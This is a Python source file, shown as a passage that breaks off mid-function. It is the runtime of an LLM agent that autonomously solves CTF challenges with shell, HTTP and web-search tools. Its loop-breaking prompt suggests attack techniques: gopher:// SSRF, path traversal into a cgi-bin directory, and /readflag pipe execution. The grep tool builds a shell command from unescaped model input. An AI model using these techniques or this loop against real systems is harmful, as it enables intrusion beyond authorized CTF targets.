"""
Agent Runtime — Conversation-based ReAct Agent Harness.

核心循环（v9 对话式）：
  init conversation → call LLM with full history → parse tool_calls
  → execute tools → append tool results to conversation → repeat
  → until flag/timeout/budget/max_turns/human_required

v9 关键改进：
- 对话累积：LLM 能看到自己之前的推理和工具结果
- 工具结果回传：执行结果作为 user message 追加到对话
- 解析失败恢复：追加格式提示而非丢弃
- http_request 工具：Web CTF 可直接发 HTTP 请求
"""
from __future__ import annotations

import json
import logging
import os
import re
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from app.config import settings
from app.core.tool_protocol import (
    AgentTurn, ToolCall, ToolObservation, ToolSpec,
    make_observation, make_tool_call, new_tool_call_id,
)
from app.core.tool_call_parser import ParseResult, parse_tool_calls
from app.core.code_execution_sandbox import CodeExecutionSandbox, SandboxResult, get_sandbox
from app.core.blackboard import Blackboard, get_blackboard
from app.core.context_compressor import compress_tool_output, build_llm_context_snippet
from app.core.llm_adapter import LLMAdapter, LLMResponse, get_adapter, get_route_adapter
from app.core.model_router import ModelRouter, RouteDecision, get_model_router
from app.core.cost_accounting import CostAccounting, get_cost_accounting
from app.core.scope_guard import ScopeGuard, scope_guard
from app.core.solve_access_guard import SolveAccessGuard
from app.core.flag_verifier import FlagVerifier
from app.core.ws_manager import emit_agent_live
from app.core.workspace_paths import resolve_workspace_path

logger = logging.getLogger(__name__)

MAX_OBSERVATION_CHARS = 10000
MAX_TOOL_CALLS_PER_TURN = 3
MAX_CONVERSATION_CHARS = 80000


@dataclass
class ToolExecutionRecord:
    tool_call_id: str
    tool_name: str
    arguments: Dict[str, Any]
    success: bool
    output: str = ""
    error: str = ""
    duration_ms: int = 0
    truncated: bool = False
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tool_call_id": self.tool_call_id,
            "tool_name": self.tool_name,
            "arguments": {k: str(v)[:200] for k, v in self.arguments.items()},
            "success": self.success,
            "output": self.output[:2000],
            "error": self.error[:500],
            "duration_ms": self.duration_ms,
            "truncated": self.truncated,
            "timestamp": self.timestamp,
        }


class AgentRuntime:
    def __init__(
        self,
        *,
        task_id: str,
        workspace: str,
        title: str = "",
        description: str = "",
        category: str = "unknown",
        flag_format: Optional[str] = None,
        attachments: Optional[List[str]] = None,
        allow_network: bool = False,
        authorized: bool = False,
        max_turns: int = 50,
        max_time_sec: int = 600,
        max_tool_calls_per_turn: int = MAX_TOOL_CALLS_PER_TURN,
        llm: Optional[LLMAdapter] = None,
        sandbox: Optional[CodeExecutionSandbox] = None,
        blackboard: Optional[Blackboard] = None,
        router: Optional[ModelRouter] = None,
        cost_accounting: Optional[CostAccounting] = None,
        verifier: Optional[FlagVerifier] = None,
        tool_executor: Optional[Callable] = None,
    ) -> None:
        self.task_id = task_id
        self.workspace = os.path.abspath(workspace)
        self.title = title
        self.description = description
        self.category = category
        self.flag_format = flag_format
        self.attachments = attachments or []
        self.allow_network = allow_network and authorized
        self.authorized = authorized
        self.max_turns = max_turns
        self.max_time_sec = max_time_sec
        self.max_tool_calls_per_turn = max_tool_calls_per_turn

        self.llm = llm or get_adapter()
        self.sandbox = sandbox or get_sandbox(allow_network=self.allow_network)
        self.blackboard = blackboard or get_blackboard()
        self.router = router or get_model_router()
        self.cost_accounting = cost_accounting or get_cost_accounting()
        self.verifier = verifier or FlagVerifier()
        self._tool_executor = tool_executor

        self.turns: List[AgentTurn] = []
        self.ledger: List[ToolExecutionRecord] = []
        self.candidate_flags: List[Dict[str, Any]] = []
        self.best_flag: Optional[str] = None
        self.state: str = "running"
        self.error: str = ""
        self.started_at: Optional[float] = None
        self._tool_specs: Dict[str, ToolSpec] = {}
        self._skills_text: str = ""

        self._conversation: List[Dict[str, str]] = []
        self._system_prompt: str = ""
        self._consecutive_parse_failures: int = 0
        self._consecutive_llm_failures: int = 0
        self._recent_command_signatures: List[str] = []
        self._loop_detected: bool = False
        self._auto_search_results: str = ""
        self._orch_task: Any = None
        self._orch_self: Any = None
        self._abort_event = threading.Event()

    def register_tool(self, spec: ToolSpec) -> None:
        self._tool_specs[spec.name] = spec

    def load_skills(self, skills_text: str) -> None:
        self._skills_text = skills_text

    def run(self) -> str:
        self.started_at = time.time()
        self.state = "running"
        self._system_prompt = self._build_system_prompt(self._format_tool_specs())
        initial = self._build_initial_context()
        self._conversation = [{"role": "user", "content": initial}]
        while self.state == "running":
            if self._abort_event.is_set():
                self.state = "human_required"
                self.error = "用户手动停止"
                break
            if self._check_termination():
                break
            from app.api.ctf import _cancel_events
            cancel_evt = _cancel_events.get(self.task_id)
            if cancel_evt and cancel_evt.is_set():
                self.state = "human_required"
                self.error = "用户手动停止"
                break
            turn = self._execute_turn()
            self.turns.append(turn)
            if turn.final_answer:
                self.best_flag = turn.final_answer
                self.state = "done"
                break
            if turn.model == "stop":
                self.state = "human_required"
                self.error = "预算耗尽"
                break
            if self._detect_command_loop():
                self._loop_detected = True
                loop_break_msg = (
                    "警告：你正在重复执行相同的命令！请立即换一种完全不同的方法。"
                )
                if self.allow_network:
                    auto_search = self._auto_search_on_loop()
                    if auto_search:
                        loop_break_msg += f"\n\n{auto_search}\n"
                    loop_break_msg += (
                        "\n如果之前的方法都不行，尝试以下替代思路：\n"
                        "1. 如果管道执行(|/readflag)不行，试试用 gopher:// 协议向自身发 POST 请求\n"
                        "2. 如果需要写文件到特定目录，用 filename 参数加路径穿越(如 ../usr/lib/cgi-bin/cmd)\n"
                        "3. 如果直接访问不行，试试用 run_shell + curl 来执行更复杂的请求构造\n"
                        "4. 如果一种协议不行，换另一种：file:// → gopher:// → http://127.0.0.1\n"
                        "5. 用 run_python 写完整的 exploit 脚本\n"
                    )
                else:
                    loop_break_msg += (
                        "例如：如果之前访问首页，现在试 POST 请求或不同路径；"
                        "如果之前用 file:// 协议，现在试 gopher:// 或 http://127.0.0.1。"
                    )
                self._conversation.append({
                    "role": "user",
                    "content": loop_break_msg,
                })
            if not turn.tool_calls and not turn.final_answer:
                self._consecutive_llm_failures += 1
                if self._consecutive_llm_failures >= 10:
                    self.state = "human_required"
                    self.error = f"LLM 连续 {self._consecutive_llm_failures} 次无有效输出"
                    break
                if self._consecutive_llm_failures >= 3:
                    self._trim_conversation()
                time.sleep(min(2 * self._consecutive_llm_failures, 15))
            else:
                self._consecutive_llm_failures = 0
        return self.state

    def abort(self, reason: str = "用户手动停止") -> None:
        self._abort_event.set()
        self.state = "human_required"
        self.error = reason
        abort_all = getattr(self.sandbox, "abort_all", None)
        if callable(abort_all):
            abort_all()

    def _check_termination(self) -> bool:
        if self.started_at and (time.time() - self.started_at) > self.max_time_sec:
            self.state = "human_required"
            self.error = f"超时 {self.max_time_sec}s"
            emit_agent_live(self.task_id, event_type="error", phase="AGENT_RUNTIME",
                            title="运行超时", detail=self.error)
            return True
        if len(self.turns) >= self.max_turns:
            self.state = "human_required"
            self.error = f"达到最大轮次 {self.max_turns}"
            emit_agent_live(self.task_id, event_type="error", phase="AGENT_RUNTIME",
                            title="达到最大轮次", detail=self.error)
            return True
        if self.cost_accounting.is_budget_exceeded(self.task_id):
            self.state = "human_required"
            self.error = "LLM 预算超支"
            emit_agent_live(self.task_id, event_type="error", phase="AGENT_RUNTIME",
                            title="LLM 预算超支", detail=self.error)
            return True
        return False

    def _detect_command_loop(self) -> bool:
        if len(self.ledger) < 6:
            return False
        recent_sigs = []
        for record in self.ledger[-6:]:
            if record.tool_name in ("run_shell", "http_request"):
                cmd = record.arguments.get("command", "") or record.arguments.get("url", "")
                sig = f"{record.tool_name}:{cmd[:80]}"
                recent_sigs.append(sig)
        if len(recent_sigs) >= 4:
            from collections import Counter
            counts = Counter(recent_sigs)
            for sig, count in counts.items():
                if count >= 3:
                    return True
        return False

    def _auto_search_on_loop(self) -> str:
        """循环检测时自动搜索 writeup，返回搜索结果文本。"""
        if not self.allow_network:
            return ""
        title = self.title or ""
        if not title.strip():
            return ""
        queries = [f"{title} CTF writeup", f"{title} {self.category} 解题思路"]
        all_results = []
        fetched_content = ""
        for q in queries[:2]:
            try:
                from app.tools.web_search import WebSearchTool
                tool = WebSearchTool()
                result = tool.run({"query": q, "max_results": 5, "allow_network": True})
                if result.get("success"):
                    for r in result.get("details", {}).get("results", []):
                        all_results.append(r)
            except Exception as e:
                logger.warning("auto_search_on_loop query=%s failed: %s", q, e)
        seen_urls = set()
        unique = []
        for r in all_results:
            url = r.get("url", "")
            if url and url not in seen_urls:
                seen_urls.add(url)
                unique.append(r)
        for r in unique[:2]:
            url = r.get("url", "")
            if any(d in url for d in ["github.com", "ctftime.org", "blog", "xz.aliyun.com"]):
                try:
                    from app.tools.web_fetch import WebFetchTool
                    fetch_tool = WebFetchTool()
                    fetch_result = fetch_tool.run({"url": url, "max_chars": 6000, "allow_network": True})
                    if fetch_result.get("success"):
                        content = fetch_result.get("details", {}).get("content", "")
                        if content and len(content) > 200:
                            fetched_content += f"\n### {r.get('title', 'Writeup')}\n来源: {url}\n{content}\n---\n"
                except Exception:
                    pass
        if unique:
            lines = ["## 自动搜索结果（检测到命令循环，系统自动搜索）"]
            for i, r in enumerate(unique[:6]):
                lines.append(f"{i+1}. {r.get('title', 'N/A')}")
                lines.append(f"   URL: {r.get('url', '')}")
                if r.get("snippet"):
                    lines.append(f"   {r['snippet'][:200]}")
            if fetched_content:
                lines.append(f"\n## Writeup 全文\n{fetched_content[:8000]}")
            lines.append("\n**请参考以上 writeup 换一种攻击方式！不要再重复之前的命令！**")
            self._auto_search_results = "\n".join(lines)
            return self._auto_search_results
        return ""

    def _trim_conversation(self) -> None:
        total = sum(len(m.get("content", "")) for m in self._conversation)
        if total <= MAX_CONVERSATION_CHARS:
            return
        while len(self._conversation) > 4 and total > MAX_CONVERSATION_CHARS:
            removed = self._conversation.pop(1)
            total -= len(removed.get("content", ""))
        if total > MAX_CONVERSATION_CHARS and len(self._conversation) > 2:
            for i in range(1, len(self._conversation) - 1):
                content = self._conversation[i].get("content", "")
                if len(content) > 2000:
                    self._conversation[i]["content"] = content[:2000] + "\n...(已压缩)"
                    total = sum(len(m.get("content", "")) for m in self._conversation)
                    if total <= MAX_CONVERSATION_CHARS:
                        break
            if total > MAX_CONVERSATION_CHARS:
                self._conversation[1]["content"] = self._conversation[1]["content"][:MAX_CONVERSATION_CHARS // 2] + "\n...(早期对话已压缩)"

    def _execute_turn(self) -> AgentTurn:
        turn_index = len(self.turns)
        self._trim_conversation()

        emit_agent_live(self.task_id, event_type="thinking", phase="AGENT_RUNTIME",
                        title=f"Agent 思考 (Turn {turn_index + 1})",
                        detail=f"对话历史 {len(self._conversation)} 条消息")

        route = self.router.decide(
            task_id=self.task_id, step="agent_think",
            rounds_used=turn_index, max_rounds=self.max_turns,
            candidate_flags=self.candidate_flags,
        )
        if route.lane == "stop":
            self.state = "human_required"
            self.error = "预算耗尽"
            return AgentTurn(turn_index=turn_index, model="stop")

        adapter = get_route_adapter(route)
        openai_tools = self._format_tools_for_openai() if adapter.provider != "anthropic" else None
        resp = adapter.chat(
            self._conversation,
            system_prompt=self._system_prompt,
            max_tokens=route.max_tokens,
            temperature=route.temperature,
            tools=openai_tools,
        )
        self._record_llm_cost("agent_think", resp, route, self._conversation)

        if not resp.success or not resp.content:
            self._consecutive_llm_failures += 1
            if self._consecutive_llm_failures >= 3:
                self._trim_conversation()
                error_msg = f"LLM 调用失败(连续{self._consecutive_llm_failures}次): {resp.error or 'unknown'}。已压缩对话，请重试。"
            else:
                error_msg = f"LLM 调用失败: {resp.error or 'unknown error'}。请重试。"
            self._conversation.append({"role": "user", "content": error_msg})
            return AgentTurn(turn_index=turn_index, model=route.model)

        content = resp.content.strip()
        thinking = getattr(resp, "thinking", "") or ""

        logger.info(
            "[AgentRuntime] task=%s turn=%d LLM response: success=%s content_len=%d thinking_len=%d has_tool_calls=%s content_head=%s",
            self.task_id, turn_index, resp.success, len(content), len(thinking),
            hasattr(resp, "tool_calls") and bool(resp.tool_calls),
            content[:300].replace("\n", "\\n"),
        )

        assistant_content = content
        if thinking:
            assistant_content = f"<thinking>\n{thinking[:500]}\n</thinking>\n\n{content}"
        self._conversation.append({"role": "assistant", "content": assistant_content})

        native_tc = None
        if hasattr(resp, "tool_calls") and resp.tool_calls:
            native_tc = resp.tool_calls

        parse_result = parse_tool_calls(content, native_tool_calls=native_tc)
        tool_calls = parse_result.tool_calls[:self.max_tool_calls_per_turn]

        logger.info(
            "[AgentRuntime] task=%s turn=%d parse_result: tool_calls=%d recoverable_error=%s native_tc=%s",
            self.task_id, turn_index, len(tool_calls), parse_result.recoverable_error,
            "yes" if native_tc else "no",
        )

        if not tool_calls:
            if parse_result.recoverable_error:
                self._consecutive_parse_failures += 1
                if self._consecutive_parse_failures >= 3:
                    feedback = (
                        f"你已经连续 {self._consecutive_parse_failures} 次输出格式错误。"
                        "请严格使用以下 JSON 格式输出工具调用：\n"
                        '```json\n{"tool_calls": [{"name": "工具名", "arguments": {"参数名": "参数值"}}]}\n```\n'
                        "或者使用简单格式：SHELL: <命令> 或 FLAG: <flag值>"
                    )
                else:
                    feedback = f"格式错误: {parse_result.recoverable_error}。请重试，输出正确的工具调用格式。"
                self._conversation.append({"role": "user", "content": feedback})
                emit_agent_live(self.task_id, event_type="warning", phase="AGENT_RUNTIME",
                                title="解析失败，重试", detail=parse_result.recoverable_error)
            else:
                self._conversation.append({
                    "role": "user",
                    "content": "请输出工具调用。使用 run_shell 执行命令，或 submit_flag 提交 flag。"
                })
            return AgentTurn(turn_index=turn_index, model=route.model, input_summary=content[:200])

        self._consecutive_parse_failures = 0

        observations: List[ToolObservation] = []
        tool_result_parts = []

        for tc in tool_calls:
            obs = self._execute_tool_call(tc)
            observations.append(obs)

            result_str = f"工具 {tc.name} 执行结果:\n"
            if obs.success:
                result_str += f"✓ 成功\n{obs.output}"
            else:
                result_str += f"✗ 失败: {obs.error}"
            if obs.truncated:
                result_str += "\n(输出已截断)"
            tool_result_parts.append(result_str)

            if obs.tool_name == "submit_flag" and obs.success:
                flag_val = tc.arguments.get("flag", "")
                if flag_val:
                    self._conversation.append({"role": "user", "content": "\n\n".join(tool_result_parts)})
                    return AgentTurn(
                        turn_index=turn_index, model=route.model,
                        input_summary=content[:200], tool_calls=tool_calls,
                        observations=observations, final_answer=flag_val,
                    )

        tool_feedback = "\n\n".join(tool_result_parts)
        dynamic = self._build_dynamic_context()
        if dynamic:
            tool_feedback += f"\n\n---\n## 当前状态\n{dynamic}"
        self._conversation.append({"role": "user", "content": tool_feedback})

        if self.candidate_flags and any(c.get("confidence", 0) >= 0.7 for c in self.candidate_flags):
            best = max(self.candidate_flags, key=lambda c: c.get("confidence", 0))
            bf = best.get("flag", "")
            if bf and self._is_valid_flag(bf):
                return AgentTurn(
                    turn_index=turn_index, model=route.model,
                    input_summary=content[:200], tool_calls=tool_calls,
                    observations=observations, final_answer=bf,
                )

        return AgentTurn(
            turn_index=turn_index, model=route.model,
            input_summary=content[:200], tool_calls=tool_calls,
            observations=observations,
        )

    def _is_valid_flag(self, flag: str) -> bool:
        if self.flag_format:
            try:
                return bool(re.search(self.flag_format, flag))
            except re.error:
                pass
        return bool(re.search(
            r'flag\{[^}]+\}|FLAG\{[^}]+\}|ctf\{[^}]+\}|CTF\{[^}]+\}|sctf\{[^}]+\}|SCTF\{[^}]+\}|ctfshow\{[^}]+\}|key\{[^}]+\}',
            flag, re.IGNORECASE
        ))

    def _build_dynamic_context(self) -> str:
        parts = []
        if self.candidate_flags:
            parts.append("### 已发现的候选 flag")
            for c in self.candidate_flags[:10]:
                parts.append(f"- {c['flag']} (confidence={c.get('confidence', '?')})")
        if self.started_at:
            parts.append(f"已运行 {int(time.time() - self.started_at)}s / {self.max_time_sec}s")
        parts.append(f"已完成 {len(self.turns)} 轮")
        recent_cmds = []
        for record in self.ledger[-20:]:
            if record.tool_name in ("run_shell", "http_request"):
                cmd = record.arguments.get("command", "") or record.arguments.get("url", "")
                recent_cmds.append(f"{record.tool_name}: {cmd[:80]}")
            elif record.tool_name == "run_python":
                recent_cmds.append(f"run_python: ({len(record.arguments.get('code', ''))} chars)")
        if recent_cmds:
            parts.append("### 最近执行的命令（不要重复）")
            for c in recent_cmds[-15:]:
                parts.append(f"- {c}")
        return "\n".join(parts)

    def _execute_tool_call(self, tc: ToolCall) -> ToolObservation:
        start = time.time()
        emit_agent_live(self.task_id, event_type="action", phase="AGENT_RUNTIME",
                        title=f"调用工具: {tc.name}",
                        detail=f"参数: {json.dumps(tc.arguments, ensure_ascii=False)[:500]}",
                        code=tc.arguments.get("command") or tc.arguments.get("code", ""))

        if self._tool_executor:
            try:
                result = self._tool_executor(tc.name, tc.arguments)
                output = result.get("output", "")
                error = result.get("error", "")
                success = result.get("success", False)
            except Exception as e:
                output = ""
                error = str(e)
                success = False
        else:
            output, error, success = self._default_execute(tc)

        duration_ms = int((time.time() - start) * 1000)
        truncated = len(output) > MAX_OBSERVATION_CHARS
        if truncated:
            full_output = output
            output = output[:MAX_OBSERVATION_CHARS] + "\n...(截断，完整输出已保存)"
        else:
            full_output = None

        record = ToolExecutionRecord(
            tool_call_id=tc.id, tool_name=tc.name, arguments=tc.arguments,
            success=success, output=full_output or output, error=error[:500],
            duration_ms=duration_ms, truncated=truncated, timestamp=time.time(),
        )
        self.ledger.append(record)

        try:
            self.blackboard.add_fact(
                task_id=self.task_id, kind="tool_result",
                content=f"{tc.name}: {output[:200]}", confidence=0.7 if success else 0.3,
                source_step="agent_runtime",
            )
        except Exception as e:
            logger.warning("write tool fact failed: %s", e)

        obs = make_observation(tc, success=success, output=output, error=error, duration_ms=duration_ms, truncated=truncated)

        emit_agent_live(self.task_id, event_type="result", phase="AGENT_RUNTIME",
                        title=f"工具结果: {tc.name}",
                        detail=f"success={success} duration={duration_ms}ms\n{output[:2000]}",
                        output=output[:3000], success=success,
                        extra={"tool_name": tc.name, "duration_ms": duration_ms})

        return obs

    def _default_execute(self, tc: ToolCall) -> Tuple[str, str, bool]:
        name = tc.name
        args = tc.arguments
        try:
            if name == "run_shell":
                return self._exec_run_shell(args)
            elif name == "run_python":
                return self._exec_run_python(args)
            elif name == "http_request":
                return self._exec_http_request(args)
            elif name == "list_dir":
                return self._exec_list_dir(args)
            elif name == "read_file":
                return self._exec_read_file(args)
            elif name == "write_file":
                return self._exec_write_file(args)
            elif name == "grep":
                return self._exec_grep(args)
            elif name == "extract_archive":
                return self._exec_extract_archive(args)
            elif name == "submit_flag":
                return self._exec_submit_flag(args)
            elif name == "ask_human":
                return self._exec_ask_human(args)
            elif name == "internal_replan":
                return self._exec_internal_replan(args)
            elif name == "web_search":
                return self._exec_web_search(args)
            elif name == "web_fetch":
                return self._exec_web_fetch(args)
            else:
                return "", f"未知工具: {name}", False
        except Exception as e:
            return "", f"工具执行异常: {type(e).__name__}: {e}", False

    def _safe_path(self, path: str) -> Optional[str]:
        resolved = resolve_workspace_path(self.workspace, path)
        return str(resolved) if resolved is not None else None

    def _exec_run_shell(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        command = args.get("command", "")
        if not command:
            return "", "empty command", False
        try:
            sandbox = get_sandbox(allow_network=self.allow_network) if self.allow_network else self.sandbox
            res = sandbox.run_shell(command, workdir=self.workspace, timeout=args.get("timeout", settings.CTF_SANDBOX_TIMEOUT))
            stdout = res.stdout[:MAX_OBSERVATION_CHARS]
            stderr = res.stderr[:MAX_OBSERVATION_CHARS]
            combined = f"exit_code={res.exit_code}\n{stdout}"
            if stderr:
                combined += f"\n--- stderr ---\n{stderr}"
            flags_in_output = self.verifier.extract_from_text(stdout, source="shell_stdout")
            if flags_in_output:
                for fc in flags_in_output:
                    existing = {c["flag"] for c in self.candidate_flags}
                    if fc.flag not in existing:
                        self.candidate_flags.append({"flag": fc.flag, "source": "run_shell", "confidence": fc.confidence})
            return combined, "" if res.success else stderr, res.success
        except ValueError as e:
            return "", f"沙箱拒绝: {e}", False

    def _exec_run_python(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        code = args.get("code", "")
        if not code:
            return "", "empty code", False
        filename = args.get("filename", "solve.py")
        timeout = args.get("timeout", settings.CTF_SANDBOX_TIMEOUT)
        try:
            script_path = self.sandbox.write_script(self.workspace, filename, code)
            sandbox = get_sandbox(allow_network=self.allow_network) if self.allow_network else self.sandbox
            res: SandboxResult = sandbox.run_python(script_path, workdir=self.workspace, timeout=timeout)
            stdout = res.stdout[:MAX_OBSERVATION_CHARS]
            stderr = res.stderr[:MAX_OBSERVATION_CHARS]
            flags_in_output = self.verifier.extract_from_text(stdout, source="stdout")
            if flags_in_output:
                for fc in flags_in_output:
                    existing = {c["flag"] for c in self.candidate_flags}
                    if fc.flag not in existing:
                        self.candidate_flags.append({"flag": fc.flag, "source": "run_python", "confidence": fc.confidence})
            combined = f"exit_code={res.exit_code}\n{stdout}"
            if stderr:
                combined += f"\n--- stderr ---\n{stderr}"
            return combined, "" if res.success else stderr, res.success
        except ValueError as e:
            return "", f"沙箱拒绝: {e}", False

    def _exec_http_request(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        import httpx
        url = args.get("url", "")
        method = args.get("method", "GET").upper()
        headers = args.get("headers", {})
        data = args.get("data", None)
        params = args.get("params", {})
        follow_redirects = args.get("follow_redirects", True)
        timeout = int(args.get("timeout", 15))
        if not url:
            return "", "no url specified", False
        if not self.allow_network:
            return "", "network access not authorized", False
        try:
            with httpx.Client(timeout=timeout, follow_redirects=follow_redirects, verify=False) as client:
                if method == "GET":
                    resp = client.get(url, headers=headers, params=params)
                elif method == "POST":
                    resp = client.post(url, headers=headers, data=data, params=params)
                else:
                    resp = client.request(method, url, headers=headers, data=data, params=params)
            body = resp.text[:MAX_OBSERVATION_CHARS]
            flags_in_output = self.verifier.extract_from_text(body, source="http_response")
            if flags_in_output:
                for fc in flags_in_output:
                    existing = {c["flag"] for c in self.candidate_flags}
                    if fc.flag not in existing:
                        self.candidate_flags.append({"flag": fc.flag, "source": "http_request", "confidence": fc.confidence})
            result = f"HTTP {resp.status_code}\nHeaders: {dict(resp.headers)}\n\n{body}"
            return result, "", True
        except Exception as e:
            return "", f"HTTP request failed: {type(e).__name__}: {e}", False

    def _exec_list_dir(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        path = args.get("path", ".")
        safe = self._safe_path(path)
        if safe is None:
            return "", f"路径超出 workspace: {path}", False
        target = safe if os.path.isdir(safe) else self.workspace
        try:
            entries = []
            for entry in sorted(os.listdir(target)):
                full = os.path.join(target, entry)
                size = os.path.getsize(full) if os.path.isfile(full) else 0
                kind = "dir" if os.path.isdir(full) else "file"
                entries.append(f"{kind:4s} {size:>10d} {entry}")
            return "\n".join(entries[:200]), "", True
        except Exception as e:
            return "", str(e), False

    def _exec_read_file(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        path = args.get("file", args.get("path", ""))
        if not path:
            return "", "no file specified", False
        safe = self._safe_path(path)
        if safe is None:
            return "", f"路径超出 workspace: {path}", False
        if not os.path.isfile(safe):
            return "", f"文件不存在: {path}", False
        offset = int(args.get("offset", 0))
        limit = int(args.get("limit", 5000))
        try:
            size = os.path.getsize(safe)
            with open(safe, "rb") as f:
                f.seek(offset)
                raw = f.read(min(limit, MAX_OBSERVATION_CHARS))
            try:
                text = raw.decode("utf-8", errors="replace")
            except Exception:
                text = raw.decode("latin-1", errors="replace")
            header = f"[{os.path.basename(safe)} size={size} offset={offset} read={len(raw)}B]\n"
            return header + text, "", True
        except Exception as e:
            return "", str(e), False

    def _exec_write_file(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        path = args.get("path", "")
        content = args.get("content", "")
        if not path:
            return "", "no path specified", False
        safe = self._safe_path(path)
        if safe is None:
            return "", f"路径超出 workspace: {path}", False
        for a in self.attachments:
            if os.path.basename(a) == os.path.basename(path):
                if not args.get("allow_overwrite", False):
                    return "", f"禁止覆盖上传原始文件: {path}（需 allow_overwrite=true）", False
        try:
            os.makedirs(os.path.dirname(safe), exist_ok=True)
            with open(safe, "w", encoding="utf-8") as f:
                f.write(content)
            return f"写入 {len(content)} 字符到 {os.path.basename(path)}", "", True
        except Exception as e:
            return "", str(e), False

    def _exec_grep(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        pattern = args.get("pattern", "")
        if not pattern:
            return "", "no pattern specified", False
        path = args.get("path", ".")
        safe = self._safe_path(path)
        if safe is None:
            return "", f"路径超出 workspace: {path}", False
        target = safe if os.path.isdir(safe) else self.workspace
        glob_pattern = args.get("glob", "*")
        max_results = int(args.get("max_results", 50))
        try:
            res = self.sandbox.run_shell(
                f"grep -rn --include='{glob_pattern}' '{pattern}' . 2>/dev/null | head -{max_results}",
                workdir=target, timeout=15,
            )
            return res.stdout[:MAX_OBSERVATION_CHARS], "" if res.success else "", res.success or bool(res.stdout.strip())
        except ValueError as e:
            return "", f"grep 被沙箱拒绝: {e}", False

    def _exec_extract_archive(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        from app.tools.archive import ExtractArchiveTool

        result = ExtractArchiveTool().run({
            "workspace": self.workspace,
            "path": args.get("path", ""),
        })
        if not result.get("success"):
            return "", result.get("summary", "archive extraction failed"), False
        details = result.get("details", {})
        output = f"{result.get('summary', 'archive extracted')}\n{details.get('file_tree', '')}"
        return output, "", True

    def _safe_extract_zip(self, zip_path: str, dest: str) -> None:
        import zipfile
        with zipfile.ZipFile(zip_path, "r") as zf:
            for member in zf.namelist():
                member_path = os.path.normpath(os.path.join(dest, member))
                if not member_path.startswith(os.path.abspath(dest) + os.sep) and member_path != os.path.abspath(dest):
                    logger.warning("zip slip detected: %s", member)
                    continue
                if member.endswith("/"):
                    os.makedirs(member_path, exist_ok=True)
                else:
                    os.makedirs(os.path.dirname(member_path), exist_ok=True)
                    with zf.open(member) as src, open(member_path, "wb") as dst:
                        dst.write(src.read())

    def _get_file_tree(self, path: str, max_depth: int = 3, prefix: str = "") -> str:
        if max_depth <= 0:
            return ""
        lines = []
        try:
            entries = sorted(os.listdir(path))
        except PermissionError:
            return f"{prefix}(permission denied)"
        for entry in entries[:50]:
            full = os.path.join(path, entry)
            if os.path.isdir(full):
                lines.append(f"{prefix}{entry}/")
                lines.append(self._get_file_tree(full, max_depth - 1, prefix + "  "))
            else:
                size = os.path.getsize(full)
                lines.append(f"{prefix}{entry} ({size}B)")
        return "\n".join(lines)

    def _exec_submit_flag(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        flag = args.get("flag", "")
        if not flag:
            return "", "no flag specified", False
        confidence = float(args.get("confidence", 0.5))
        evidence_list = args.get("evidence", [])
        existing = {c["flag"] for c in self.candidate_flags}
        if flag not in existing:
            self.candidate_flags.append({"flag": flag, "source": "submit_flag", "confidence": confidence})
        if self.flag_format:
            try:
                if not re.search(self.flag_format, flag):
                    return f"flag '{flag}' 不符合格式 {self.flag_format}", "", False
            except re.error:
                pass
        is_valid = self._is_valid_flag(flag)
        if is_valid:
            self.best_flag = flag
            self.state = "done"
        return f"flag 已记录: {flag} (confidence={confidence:.2f}, valid_format={is_valid})", "", is_valid

    def _exec_ask_human(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        question = args.get("question", "Agent needs human assistance")
        self.state = "human_required"
        self.error = f"Agent 请求人工: {question}"
        return question, "", True

    def _exec_internal_replan(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        reason = args.get("reason", "")
        return f"已记录 replan 请求: {reason}", "", True

    def _exec_web_search(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        query = args.get("query", "")
        if not query:
            return "", "no query specified", False
        if not self.allow_network:
            return "", "network access not authorized", False
        try:
            from app.tools.web_search import WebSearchTool
            tool = WebSearchTool()
            result = tool.run({
                "query": query,
                "max_results": int(args.get("max_results", 5)),
                "allow_network": True,
            })
            if result.get("success"):
                results = result.get("details", {}).get("results", [])
                lines = [f"搜索 '{query}' 找到 {len(results)} 条结果:"]
                for i, r in enumerate(results):
                    lines.append(f"{i+1}. {r.get('title', 'N/A')}")
                    lines.append(f"   URL: {r.get('url', '')}")
                    if r.get("snippet"):
                        lines.append(f"   {r['snippet'][:200]}")
                return "\n".join(lines), "", True
            else:
                return "", f"搜索失败: {result.get('summary', '')}", False
        except Exception as e:
            return "", f"搜索异常: {type(e).__name__}: {e}", False

    def _exec_web_fetch(self, args: Dict[str, Any]) -> Tuple[str, str, bool]:
        url = args.get("url", "")
        if not url:
            return "", "no url specified", False
        if not self.allow_network:
            return "", "network access not authorized", False
        try:
            from app.tools.web_fetch import WebFetchTool
            tool = WebFetchTool()
            result = tool.run({
                "url": url,
                "max_chars": int(args.get("max_chars", 10000)),
                "allow_network": True,
            })
            if result.get("success"):
                content = result.get("details", {}).get("content", "")
                status = result.get("details", {}).get("status_code", 0)
                header = f"[web_fetch {url} HTTP {status} {len(content)} chars]\n"
                return header + content, "", True
            else:
                return "", f"获取失败: {result.get('summary', '')}", False
        except Exception as e:
            return "", f"获取异常: {type(e).__name__}: {e}", False

    def _format_tools_for_openai(self) -> List[Dict[str, Any]]:
        """将内部 ToolSpec 转为 OpenAI function calling tools 格式。"""
        tools = []
        for name, spec in sorted(self._tool_specs.items()):
            tools.append({
                "type": "function",
                "function": {
                    "name": spec.name,
                    "description": spec.description,
                    "parameters": spec.input_schema,
                },
            })
        return tools

    def _build_initial_context(self) -> str:
        parts = [f"## 任务信息\n题目: {self.title}\n题面: {self.description[:5000]}\n题型: {self.category}\n"]
        if self.flag_format:
            parts.append(f"flag格式: {self.flag_format}\n")
        if self.allow_network:
            parts.append(f"已授权联网: 是\n")
        if self.attachments:
            parts.append("## 附件文件")
            for a in self.attachments:
                basename = os.path.basename(a)
                size = os.path.getsize(a) if os.path.isfile(a) else 0
